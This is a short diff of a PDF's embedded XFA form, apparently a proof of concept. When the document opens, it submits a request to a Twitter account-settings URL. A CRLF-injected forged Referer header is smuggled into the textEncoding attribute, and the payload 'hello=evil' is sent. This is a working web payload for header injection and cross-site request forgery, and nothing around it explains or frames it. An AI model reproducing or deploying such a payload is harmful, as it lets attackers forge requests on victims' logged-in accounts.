@@ -18,7 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-16&#xD;&#xA;Referer: https://twitter.com/settings/add_phone?edit_phone=true&#xD;&#xA;"
+                     textEncoding="UTF-8&#xD;&#xA;Referer: https://twitter.com/settings/add_phone?edit_phone=true&#xD;&#xA;"
                      xdpContent="hello=evil"
                      target="https://twitter.com/settings/add_phone"/>
             </event>
